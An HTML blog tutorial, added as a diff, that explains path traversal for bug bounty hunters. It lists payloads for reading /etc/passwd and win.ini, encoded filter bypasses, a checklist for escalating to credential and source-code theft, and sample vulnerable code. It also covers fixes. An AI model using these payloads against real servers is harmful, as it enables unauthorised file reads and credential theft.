@@ -1,0 +1,358 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Path Traversal Vulnerability — TheCyberAryan</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="description" content="A sarcastic yet highly informative guide to Path Traversal vulnerabilities with examples, payloads, and practical tips for bug bounty hunters." />
+
+<style>
+  body {
+    background: #050711;
+    color: #e8edff;
+    font-family: 'Inter', sans-serif;
+    line-height: 1.8;
+    padding: 40px 16px;
+  }
+  h1, h2 {
+    color: #4df3ff;
+    font-weight: 700;
+  }
+  h3 {
+    color: #ff6bd6;
+  }
+  p {
+    color: #d8e2ff;
+  }
+  code {
+    background: #0c1020;
+    padding: 3px 6px;
+    border-radius: 4px;
+    color: #c6d4ff;
+    font-size: 0.95rem;
+  }
+  pre {
+    background: #0c1020;
+    padding: 14px;
+    border-radius: 6px;
+    overflow-x: auto;
+    color: #cbd5f5;
+    border-left: 3px solid #4df3ff;
+  }
+  .box {
+    background: #0a0f1c;
+    padding: 16px;
+    border-left: 3px solid #4df3ff;
+    margin: 20px 0;
+    border-radius: 6px;
+  }
+  .danger {
+    border-color: #ff6b6b;
+  }
+  ul { margin-left: 20px; }
+  li { margin-bottom: 8px; }
+  footer {
+    margin-top: 40px;
+    padding-top: 20px;
+    border-top: 1px solid #222a46;
+    color: #94a3b8;
+    text-align: center;
+    font-size: 0.9rem;
+  }
+  .highlight {
+    color: #4df3ff;
+    font-weight: 600;
+  }
+</style>
+
+</head>
+<body>
+
+<h1>📂 Path Traversal — When “../” Becomes a Skeleton Key</h1>
+
+<p>
+Path Traversal is that vulnerability where the server politely asks:
+</p>
+
+<p><em>“Which file do you want?”</em></p>
+
+<p>
+And you respond:
+</p>
+
+<p><em>“Yes.”</em></p>
+
+<div class="box">
+In one line:<br>
+<strong>Path Traversal = Escaping the intended folder using <code>../</code> and reading files you were never supposed to see.</strong>
+</div>
+
+<p>
+It’s like the application hands you a file browser and says:
+<br><br>
+<strong>“Promise me you’ll only open your own files 😇”</strong>  
+<br>
+And you, as a hacker, obviously don’t.
+</p>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🧠 The Basic Idea (In Easy Language)</h2>
+
+<p>
+The app wants to serve you, say, PDF reports from:
+</p>
+
+<pre><code>/var/www/app/reports/</code></pre>
+
+<p>So it has a URL like:</p>
+
+<pre><code>/download?file=invoice_123.pdf</code></pre>
+
+<p>On the backend, some genius wrote:</p>
+
+<pre><code>file_path = "/var/www/app/reports/" + user_input
+open(file_path)</code></pre>
+
+<p>
+Now if you give:
+</p>
+
+<pre><code>invoice_123.pdf</code></pre>
+
+<p>Cool, legit.  
+But if you give:</p>
+
+<pre><code>../../../../etc/passwd</code></pre>
+
+<p>Then the path becomes:</p>
+
+<pre><code>/var/www/app/reports/../../../../etc/passwd</code></pre>
+
+<p>
+The OS goes: “Yeah that’s valid, no problem.”  
+And you just read a system file.
+</p>
+
+<div class="box danger">
+<strong>That’s Path Traversal.</strong><br>
+You walk out of the “allowed” directory and start exploring the whole file system.
+</div>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>📍 Where Path Traversal Usually Appears</h2>
+
+<p>Any feature that deals with files or paths is suspicious by default:</p>
+
+<ul>
+  <li><code>/download?file=</code></li>
+  <li><code>/view?template=</code></li>
+  <li><code>/image?name=</code></li>
+  <li><code>/logs?file=</code></li>
+  <li>Backup restore / export functions</li>
+  <li>Custom theme/template loaders</li>
+</ul>
+
+<p>
+If the request looks like:
+</p>
+
+<pre><code>GET /something?file=report1.txt</code></pre>
+
+<p>…your brain should auto-complete it as:</p>
+
+<pre><code>GET /something?file=../../../../etc/passwd</code></pre>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🧪 Classic Payloads (Your Starter Pack)</h2>
+
+<p>Basic traversal to read Linux <code>/etc/passwd</code>:</p>
+
+<pre><code>../../../../etc/passwd</code></pre>
+
+<p>URL-encoded (because devs sometimes block <code>../</code>):</p>
+
+<pre><code>..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></pre>
+
+<p>Double-encoded (when they got “smart” and decode once):</p>
+
+<pre><code>..%252F..%252F..%252F..%252Fetc%252Fpasswd</code></pre>
+
+<p>On Windows systems, target:</p>
+
+<pre><code>..\..\..\..\windows\win.ini</code></pre>
+
+<p>
+You’re basically testing how much the server respects boundaries.  
+Spoiler: usually not much.
+</p>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🔍 Realistic Example — File Download Endpoint</h2>
+
+<p>Normal user request:</p>
+<pre><code>GET /download?file=invoice_2024_01.pdf</code></pre>
+
+<p>Server logic (very optimistic):</p>
+<pre><code>base = "/var/www/app/invoices/"
+file = base + request.GET["file"]
+return open(file)</code></pre>
+
+<p>You change:</p>
+<pre><code>/download?file=../../../../etc/passwd</code></pre>
+
+<p>If the server responds with something like:</p>
+
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...</code></pre>
+
+<div class="box danger">
+🎉 You just performed a Path Traversal and read a sensitive system file.  
+Welcome to “This is now a critical vulnerability” territory.
+</div>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🔎 What to Try Reading (Carefully, In Authorized Environments)</h2>
+
+<p>On <strong>Linux</strong> targets:</p>
+<ul>
+  <li><code>/etc/passwd</code> – basic sanity check</li>
+  <li><code>/etc/hostname</code></li>
+  <li><code>/etc/hosts</code></li>
+  <li>Application configs like: <code>config.php</code>, <code>.env</code></li>
+</ul>
+
+<p>On <strong>Windows</strong> targets:</p>
+<ul>
+  <li><code>C:\Windows\win.ini</code></li>
+  <li><code>C:\Windows\System32\drivers\etc\hosts</code></li>
+</ul>
+
+<p>If you start hitting env/config files, you’re in “credentials-leaking” level impact.</p>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🧬 Bypassing Filters (Because Devs Google “How to block ../”)</h2>
+
+<p>Common defenses you’ll see:</p>
+<ul>
+  <li>Blocking exact string <code>../</code></li>
+  <li>Replacing <code>../</code> with empty string</li>
+  <li>Restricting extensions (e.g., only <code>.pdf</code>)</li>
+</ul>
+
+<h3>Tricks to Try</h3>
+
+<ul>
+  <li>Double encoding: <code>%2e%2e%2f</code>, <code>%252e%252e%252f</code></li>
+  <li>Using <code>..\/</code> or mixed slashes</li>
+  <li>Adding junk like <code>....//</code> which normalizes to <code>../</code></li>
+  <li>Appending valid extensions: <code>../../../../etc/passwd%00.pdf</code> on older systems</li>
+</ul>
+
+<div class="box">
+<strong>Remember:</strong>  
+Even if <code>../</code> is blocked, the path might still normalize back to a parent directory after the filesystem resolves it.
+</div>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>💣 Path Traversal → Source Code → Full Pwn</h2>
+
+<p>
+Path Traversal doesn’t stop at <code>/etc/passwd</code>. That’s just your “yes, it works” file.
+</p>
+
+<p>You can aim for:</p>
+<ul>
+  <li>Application source code (e.g., <code>index.php</code>, controllers, routes)</li>
+  <li>Configuration files with DB credentials</li>
+  <li>API keys, tokens, mail credentials</li>
+</ul>
+
+<p>
+Once you get:
+</p>
+
+<pre><code>DB_PASSWORD="something-super-secure-but-actually-not"</code></pre>
+
+<p>
+…you’ve moved from “file read bug” to “database compromise”.
+</p>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🔐 How Developers Should Fix It (In Theory)</h2>
+
+<p>
+But we both know if they did, you’d have fewer bounties. Anyway:
+</p>
+
+<ul>
+  <li>Use a strict <strong>allow-list</strong> of filenames or IDs instead of raw file paths.</li>
+  <li>Never trust user input as part of a filesystem path.</li>
+  <li>Normalize and validate the path server-side, and ensure it stays under the intended directory.</li>
+  <li>Use OS-level sandboxing / chroot where possible.</li>
+</ul>
+
+<div class="box danger">
+<strong>Golden Rule:</strong><br>
+If the user can influence the path → you must assume they will try to escape it.
+</div>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🕵️‍♂️ Quick Hacker Checklist for Path Traversal</h2>
+
+<ul>
+  <li>Find any parameter that looks like it references a file: <code>file=</code>, <code>path=</code>, <code>template=</code>, <code>log=</code>, <code>download=</code>.</li>
+  <li>Try <code>../</code> once and see what happens.</li>
+  <li>If blocked, try encoded / double-encoded payloads.</li>
+  <li>First aim for <code>/etc/passwd</code> or <code>win.ini</code> to prove impact.</li>
+  <li>Then go after application configs / source code.</li>
+</ul>
+
+<p>
+If you can read sensitive files that belong to the system or application,  
+you’ve got yourself a solid, high-impact vulnerability.
+</p>
+
+<hr style="border-color:#1a2238;margin:30px 0">
+
+<h2>🎯 Final Thoughts</h2>
+
+<p>
+Path Traversal is one of those vulnerabilities that is:
+</p>
+
+<ul>
+  <li>Simple to understand</li>
+  <li>Fun to test</li>
+  <li>Often underestimated by developers</li>
+  <li>Capable of turning into full system compromise</li>
+</ul>
+
+<p>
+All you’re doing is saying:
+<br><br>
+<strong>“Hey server, show me this file.”</strong><br>
+And the server says:<br>
+<strong>“Say no more.”</strong>
+</p>
+
+<p>
+As always — use this knowledge only on authorized targets.  
+You want bug bounty payouts, not court dates.
+</p>
+
+<footer>
+  <p>// Written for <strong>TheCyberAryan</strong> — Hack responsibly.</p>
+</footer>
+
+</body>
+</html>
